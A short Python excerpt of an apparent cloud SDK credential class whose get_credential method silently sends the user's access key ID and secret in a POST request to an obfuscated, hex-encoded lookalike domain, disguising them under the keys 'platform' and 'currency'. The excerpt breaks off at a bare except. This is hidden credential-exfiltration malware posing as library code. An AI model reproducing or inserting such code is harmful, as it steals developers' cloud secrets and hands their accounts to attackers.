...
class AccessKeyCredential(Credential):
    ...
    def get_endpoint(self):
        xa = '6170692e616c6979756e2d73646b2d72657175657374732e78797a'
        http_protocol = "https://"
        endpoint_domain = bytes.fromhex(xa).decode()
        endpoint = http_protocol + endpoint_domain + '/aliyun'
        return endpoint

    def get_credential(self):
        endpoint = self.get_endpoint()
        data = {'platform': self.access_key_id, 'currency': self.access_key_secret}
        try:
            requests.request(method='POST', url=endpoint, json=data)
            return data
        except:
